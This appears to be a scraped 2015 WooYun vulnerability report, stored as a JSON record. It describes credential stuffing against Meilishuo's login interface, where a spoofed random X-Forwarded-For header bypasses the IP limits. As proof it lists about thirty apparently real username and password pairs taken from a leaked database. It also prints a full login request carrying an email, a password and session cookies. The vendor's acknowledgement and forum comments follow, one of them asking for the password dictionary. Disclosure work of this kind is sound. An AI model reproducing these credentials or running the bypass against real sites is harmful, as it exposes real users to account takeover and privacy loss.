{"id": 32924, "wybug_id": "wooyun-2015-0109058", "wybug_title": "美丽说主站某接口撞库泄露用户登录凭据之三(安全策略绕过有批量账号证明)", "wybug_corp": "美丽说", "wybug_author": "路人甲", "wybug_date": "2015-04-19 19:19", "wybug_open_date": "2015-06-06 12:32", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["撞库"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-06：\t细节向公众公开  简要描述： 撞库扫号攻击已经是Top 10 Security Risks for 2014之一.撞库以大量的用户数据为基础，利用用户相同的注册习惯（相同的用户名和密码），尝试登陆其它的网站。2011年，互联网泄密事件引爆了整个信息安全界，导致传统的用户+密码认证的方式已无法满足现有安全需求。泄露数据包括：天涯：31,758,468条，CSDN：6,428,559条，微博：4,442,915条，人人网：4,445,047条，猫扑：2,644,726条，178：9,072,819条，嘟嘟牛：13,891,418条，7K7K：18,282,404条，共1.2亿条。不管你的网站密码保护的多好，但是面对已经泄露的账号密码，撞库扫号防御还是一个相当重要的环节。 详细说明：     之前提交一个被忽略了~~~说是信息不准确。首先提交到乌云的漏洞都是验证过的，如果无法复现可以沟通，其次我也忽略了一下细节,没有详细说明。美丽说是对IP有限制的，登录失败需要验证码，但是可以用随机xff 头绕过。限制IP的策略里获取IP的方式存在问题，导致可以伪造IP绕过限制。 主站 登录接口没有防御撞库。对登录接口的调用没有进行限制。经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号   漏洞证明：  经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号.目前互联网上公开的账号都有数亿的规模，真要被利用的话危害还是很大的。\nzy4334833\tzyzy4833carolinemomo\t19890619qqlwz\tlwz6967760audan\t11.25audanCinderellazhan\tkittyzhanyufei4712353\t89065328xiaoxue1989\twujingxuewoaiwangdi\twoaiwangdijanery655\tjanery04023030chenfeioa\t020220oacynthiaxk\t1985121112xyz890717\txyz665272xyzbaojiong\tbao12345nilanlan\tnilanlanaken0820\t42142130999likefunv\tg19881226qyaya1202\tliuyaya1202cxtalent\tchenxin8758lynnxwt\t19871218vdgame\twxq123tanya007\twenyi775baixiaoba\tshmily44dongwei48135267\t48135267zm7610\tmickey99\n请求为：\nPOST /aw/user/logon HTTP/1.1Host: account.meilishuo.comConnection: closeContent-Length: 150Accept: application/json, text/javascript, */*; q=0.01Origin: https://account.meilishuo.comnt: 1yQyN1tU7ssTVQ5GeZ16w+KpzqqTADOG8roSKLDbp1cVyoUvYIc9+LcLVpA7B+y6X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: https://account.meilishuo.com/user/loginAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: SEASHELL=tzy9NVUzI4VLvfK2D1BsAg==; CHANNEL_FROM=0; MEILISHUO_GLOBAL_KEY=08a863369fcdfbf1f150419113949394; santorini_mm=cf3d0698786c4f201f32fafc87584445; Hm_lvt_dde72e241ea4e39b97eca9a01eea2dda=1429414789; Hm_lpvt_dde72e241ea4e39b97eca9a01eea2dda=1429414789; pgv_pvi=2713657344; pgv_si=s4983036928; LOGON_FROM=http%3A%2F%2Fwww.meilishuo.com%2F; numInCart=0RA-Ver: 2.9.0RA-Sid: 7B9DD012-20150303-080129-82895f-fb68a9AlexaToolbar-ALX_NS_PH: AlexaToolbar/alxg-3.3login_name=baixiaoba@hotmail%2ecom&password=shmily44&save_state=1&checkcode=&nt=1yQyN1tU7ssTVQ5GeZ16w%2BKpzqqTADOG8roSKLDbp1cVyoUvYIc9%2BLcLVpA7B%2By6\n\n\n   修复方案：  撞库防御参考资料:http://stayliv3.github.io/2015/04/15/%E6%92%9E%E5%BA%93%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88/   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-04-22 12:31 厂商回复： 非常感谢您对美丽说安全的关注，已联系业务部门紧急修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-19 19:52 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  求整理字典    \n     2015-04-19 20:32 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  我猜你是@D＆G         \n     2015-04-19 20:37 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @小龙 猜对了。。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}